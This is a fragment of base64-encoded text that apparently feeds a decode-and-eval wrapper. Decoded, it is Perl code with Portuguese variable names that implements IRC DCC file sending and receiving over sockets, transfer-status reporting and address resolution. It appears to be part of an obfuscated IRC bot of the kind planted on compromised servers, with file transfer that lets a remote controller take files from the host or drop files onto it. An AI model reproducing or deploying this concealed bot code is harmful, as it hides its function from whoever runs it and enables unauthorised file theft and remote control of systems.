AgICAgICAgIG15ICRzZW5kX2J5dGVzOw0KICAgICAgICAgIHJlYWQoU0VOREZJTEUsICRzZW5kX2J5dGVzLCAxMDI0KTsNCiAgICAgICAgICBwcmludCAkZmggIiRzZW5kX2J5dGVzIjsNCiAgICAgICAgICBjbG9zZShTRU5ERklMRSk7DQogICAgIH0NCiAgIH0NCn0NCg0Kc3ViIFNFTkQgew0KICBteSAoJG5pY2ssICRhcnF1aXZvKSA9IEBfOw0KICB1bmxlc3MgKC1yICIkYXJxdWl2byIpIHsNCiAgICByZXR1cm4oMCk7DQogIH0NCiAgbXkgJGRjY2FyayA9ICRhcnF1aXZvOw0KICAkZGNjYXJrID1+IHMvWy4qXC9dKFxTKykvJDEvOw0KICBteSAkbWV1aXAgPSAkOjppcmNfc2VydmVyc3siJDo6SVJDX2N1cl9zb2NrZXQifXsnbWV1aXAnfTsNCiAgbXkgJGxvbmdpcCA9IHVucGFjaygiTiIsaW5ldF9hdG9uKCRtZXVpcCkpOw0KICBteSBAZmlsZXN0YXQgPSBzdGF0KCRhcnF1aXZvKTsNCiAgbXkgJHNpemVfdG90YWw9JGZpbGVzdGF0WzddOw0KICBpZiAoJHNpemVfdG90YWwgPT0gMCkgew0KICAgICByZXR1cm4oMCk7DQogIH0NCiAgbXkgKCRwb3J0YSwgJHNlbmRzb2NrKTsNCiAgZG8gew0KICAgICRwb3J0YSA9IGludCByYW5kKDY0NTExKTsNCiAgICAkcG9ydGEgKz0gMTAyNDsNCiAgICAkc2VuZHNvY2sgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoTGlzdGVuPT4xLCBMb2NhbFBvcnQgPT4kcG9ydGEsIFByb3RvID0+ICd0Y3AnKSBhbmQgJGRjY19zZWwtPmFkZCgkc2VuZHNvY2spOw0KICB9IHVudGlsICRzZW5kc29jazsNCiAgJERDQ3skc2VuZHNvY2t9e3RpcG99ID0gJ3NlbmQnOw0KICAkRENDeyRzZW5kc29ja317bmlja30gPSAkbmljazsNCiAgJERDQ3skc2VuZHNvY2t9e2J5dGVzfSA9ICRzaXplX3RvdGFsOw0KICAkRENDeyRzZW5kc29ja317YXJxdWl2b30gPSAkYXJxdWl2bzsNCiAgJjo6Y3RjcCgiJG5pY2siLCAiRENDIFNFTkQgJGRjY2FyayAkbG9uZ2lwICRwb3J0YSAkc2l6ZV90b3RhbCIpOw0KfQ0Kc3ViIEdFVCB7DQogIG15ICgkYXJxdWl2bywgJGRjY2xvbmdpcCwgJGRjY3BvcnRhLCAkYnl0ZXMsICRuaWNrKSA9IEBfOw0KICByZXR1cm4oMCkgaWYgKC1lICIkYXJxdWl2byIpOw0KICBpZiAob3BlbihGSUxFLCAiPiAkYXJxdWl2byIpKSB7DQogICAgIGNsb3NlIEZJTEU7DQogIH0gZWxzZSB7DQogICAgcmV0dXJuKDApOw0KICB9DQogIG15ICRkY2NpcD1maXhhZGRyKCRkY2Nsb25naXApOw0KICByZXR1cm4oMCkgaWYgKCRkY2Nwb3J0YSA8IDEwMjQgb3Igbm90IGRlZmluZWQgJGRjY2lwIG9yICRieXRlcyA8IDEpOw0KICBteSAkZGNjc29jayA9IElPOjpTb2NrZXQ6OklORVQtPm5ldyhQcm90bz0+InRjcCIsIFBlZXJBZGRyPT4kZGNjaXAsIFBlZXJQb3J0PT4kZGNjcG9ydGEsIFRpbWVvdXQ9PjE1KSBvciByZXR1cm4gKDApOw0KICAkZGNjc29jay0+YXV0b2ZsdXNoKDEpOw0KICAkZGNjX3NlbC0+YWRkKCRkY2Nzb2NrKTsNCiAgJERDQ3skZGNjc29ja317dGlwb30gPSAnZ2V0JzsNCiAgJERDQ3skZGNjc29ja317aXRpbWV9ID0gdGltZTsNCiAgJERDQ3skZGNjc29ja317bmlja30gPSAkbmljazsNCiAgJERDQ3skZGNjc29ja317Ynl0ZXN9ID0gJGJ5dGVzOw0KICAkRENDeyRkY2Nzb2NrfXtjdXJieXRlfSA9IDA7DQogICREQ0N7JGRjY3NvY2t9e2FycXVpdm99ID0gJGFycXVpdm87DQogICREQ0N7JGRjY3NvY2t9e2lwfSA9ICRkY2NpcDsNCiAgJERDQ3skZGNjc29ja317cG9ydGF9ID0gJGRjY3BvcnRhOw0KICAkRENDeyRkY2Nzb2NrfXtzdGF0dXN9ID0gIlJlY2ViZW5kbyI7DQp9DQpzdWIgU3RhdHVzIHsNCiAgbXkgJHNvY2tldCA9IHNoaWZ0Ow0KICBteSAkc29ja190aXBvID0gJERDQ3skc29ja2V0fXt0aXBvfTsNCiAgdW5sZXNzIChsYygkc29ja190aXBvKSBlcSAiY2hhdCIpIHsNCiAgICBteSAkbmljayA9ICREQ0N7JHNvY2tldH17bmlja307DQogICAgbXkgJGFycXVpdm8gPSAkRENDeyRzb2NrZXR9e2FycXVpdm99Ow0KICAgIG15ICRpdGltZSA9ICREQ0N7JHNvY2tldH17aXRpbWV9Ow0KICAgIG15ICRmdGltZSA9IHRpbWU7DQogICAgbXkgJHN0YXR1cyA9ICREQ0N7JHNvY2tldH17c3RhdHVzfTsNCiAgICAkZnRpbWUgPSAkRENDeyRzb2NrZXR9e2Z0aW1lfSBpZiBkZWZpbmVkKCREQ0N7JHNvY2tldH17ZnRpbWV9KTsNCg0KICAgIG15ICRkX3RpbWUgPSAkZnRpbWUtJGl0aW1lOw0KDQogICAgbXkgJGN1cl9ieXRlID0gJERDQ3skc29ja2V0fXtjdXJieXRlfTsNCiAgICBteSAkYnl0ZXNfdG90YWwgPSAgJERDQ3skc29ja2V0fXtieXRlc307DQoNCiAgICBteSAkcmF0ZSA9IDA7DQogICAgJHJhdGUgPSAoJGN1cl9ieXRlLzEwMjQpLyRkX3RpbWUgaWYgJGN1cl9ieXRlID4gMDsNCiAgICBteSAkcG9yY2VuID0gKCRjdXJfYnl0ZSoxMDApLyRieXRlc190b3RhbDsNCg0KICAgIG15ICgkcl9kdXYsICRwX2R1dik7DQogICAgaWYgKCRyYXRlID1+IC9eKFxkKylcLihcZCkoXGQpKFxkKS8pIHsNCiAgICAgICAkcl9kdXYgPSAkMzsgJHJfZHV2KysgaWYgJDQgPj0gNTsNCiAgICAgICAkcmF0ZSA9ICIkMVwuJDIiLiIkcl9kdXYiOw0KICAgIH0NCiAgICBpZiAoJHBvcmNlbiA9fiAvXihcZCspXC4oXGQpKFxkKShcZCkvKSB7DQogICAgICAgJHBfZHV2ID0gJDM7ICRwX2R1disrIGlmICQ0ID49IDU7DQogICAgICAgJHBvcmNlbiA9ICIkMVwuJDIiLiIkcF9kdXYiOw0KICAgIH0NCiAgICByZXR1cm4oIiRzb2NrX3RpcG8iLCIkc3RhdHVzIiwiJG5pY2siLCIkYXJxdWl2byIsIiRieXRlc190b3RhbCIsICIkY3VyX2J5dGUiLCIkZF90aW1lIiwgIiRyYXRlIiwgIiRwb3JjZW4iKTsNCiAgfQ0KICByZXR1cm4oMCk7DQp9DQoNCnN1YiBmaXhhZGRyIHsNCiAgICBteSAoJGFkZHJlc3MpID0gQF87DQoNCiAgICBjaG9tcCAkYWRkcmVzczsNCiAgICBpZiAoJGFkZHJlc3MgPX4gL15cZCskLykgew0KICAgICAgICByZXR1cm4gaW5ldF9udG9hKHBhY2sgIk4iLCAkYWRkcmVzcyk7DQogICAgfSBlbHNpZiAoJGFkZHJlc3MgPX4gL15bMTJdP1xkezEsMn1cLlsxMl0/XGR7MSwyfVwuWzEyXT9cZHsxLDJ9XC5bMTJdP1xkezEsMn0kLykgew0KICAgICAgICByZXR1cm4gJGFkZHJlc3M7DQogICAgfSBlbHNpZiAoJGFkZHJlc3MgPX4gdHIvYS16QS1aLy8pIHsNCiAgICAgICAgcmV0dXJuIGluZXRfbnRvYSgoKGdldGhvc3RieW5hbWUoJGFkZHJlc3MpKVs0XSlbMF0pOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHJldHVybjsNCiAgICB9DQp9'));
